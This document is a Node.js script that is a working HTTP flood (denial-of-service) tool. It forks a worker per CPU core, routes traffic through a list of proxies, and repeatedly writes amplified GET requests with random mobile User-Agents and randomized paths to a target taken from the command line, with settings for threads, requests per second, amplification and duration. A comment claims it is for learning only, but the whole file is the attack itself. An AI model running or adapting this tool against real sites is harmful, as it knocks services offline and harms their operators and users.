const fs = require('fs');
const net = require('net');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;
const URL = require('url');
const stringRandom = require('string-random'); 
let o = process.argv[8]
//仅作为学习作用 By Yasaki
process.on('uncaughtException', function(e) {
}).on('unhandledRejection', function(e) {
}).on('warning', e => {
}).setMaxListeners(0);

var proxies = [];

const UAs = [
   "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16C50 Version/12.0 Safari/604.1",
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G9650 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; vivo Y83 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/5.6.8.5",
"Mozilla/5.0 (Linux; U; Android 6.0.1; zh-cn; OPPO A57 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.7.1",
"Mozilla/5.0 (Linux; U; Android 7.0; zh-cn; Redmi Note 4X Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.2.11",
"Mozilla/5.0 (Android 9.0; Mobile; rv:66.0) Gecko/66.0 Firefox/66.0",
"Mozilla/5.0 (Linux; U; Android 5.1.1; zh-cn; OPPO A33m Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/9.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 8.0.0; zh-cn; MI 5s Plus Build/OPR1.170623.032) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.4.5",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.1",
"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; PAAM00 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/9.1 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OS105 Build/NGI77B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.8.9.969 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Mobile Safari/537.36 V1_AND_SQ_7.1.0_0_TIM_D TIM2.0/2.1.5.1754 QQ/6.5.5  NetType/UNKNOWN WebP/0.4.1 Pixel/1080",
"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-tw; Redmi Note 5 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.5.2",
"Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; MI 4LTE Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.3.2",
"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; MI 8 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.9 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 8.1.0; zh-cn; PBDM00 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/10.5.0.2.1beta",
"Mozilla/5.0 (Linux; Android 5.0; zh-cn; GRA-TL10 Build/HUAWEIGRA-TL10) AppleWebkit/534.30 (KHTML, like Gecko) Version/8.0 SogouMSE,SogouMobileBrowser/4.1.6 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 5.1.1; zh-cn; MI NOTE Pro Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.5.14",
"Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; MZ-m2 note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.10.3 UWS/2.15.0.4 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM901 Build/MXB48T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",


];

function generate_payload(args) {
    let headers = "";
    headers += 'GET ' + args.target + ' HTTP/1.1' + '\r\n'
    headers += 'Host: ' + args.direct + '\r\n'
    headers += 'Connection: keep-alive' + '\r\n'
    headers +=  'user-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\n'
    headers += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' + '\r\n'
    headers += 'Accept-Language: en-US,en;q=0.9' + '\r\n'
    headers += 'Accept-Encoding: gzip, deflate, br' + '\r\n'
    headers += 'Pragma: no-cache' + '\r\n'
    headers += 'Upgrade-Insecure-Requests: 1' + '\r\n'
    headers += "\r\n";

    return headers.repeat(args.amp)
}

async function conn(args) {

    setInterval(function() {
        let proxy = proxies[Math.floor(Math.random() * (proxies.length - 1))];
        let socket = net.connect(proxy.split(":")[1], proxy.split(":")[0]);
        socket.setKeepAlive(true, 5000)
        socket.setTimeout(5000);
        socket.once('error', err => {
        });
        socket.once('disconnect', () => {
            //console.log('Disconnect');
        });
        socket.once('data', data => {
        });

        let payload = generate_payload(args);
        for(let i = 0;i < args.rps; i++) socket.write(payload);
        
        socket.on('data', function() {
            setTimeout(function() {
                socket.destroy();
                return delete socket;
            }, 5000);
        })
    });
}

function start(args) {
    console.log(args);

    setTimeout(() => {
        process.exit(4);
    }, (args.time * 1000));

    proxies = fs.readFileSync(args.proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
    for (let i = 0; i < args.threads; i++) {
        conn(args)
    }
}



if (cluster.isMaster) {
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }
} else {
    start({
        target: process.argv[2] + '/' + stringRandom(o,'DEFGHJKMXDGDYHERYEHFshfdsysrdghsdyher6#$%#YZabcdefmnprstwxyz2345678=?/=?/=?/=?/=?/=?/=?/=?/=?/=?/=?/') ,
        direct: URL.parse(process.argv[2]).host,
        threads: parseInt(process.argv[3]),
        proxyfile: process.argv[4],
        time: parseInt(process.argv[5]),
        rps: parseInt(process.argv[6]),
        amp: parseInt(process.argv[7]),
    })
}
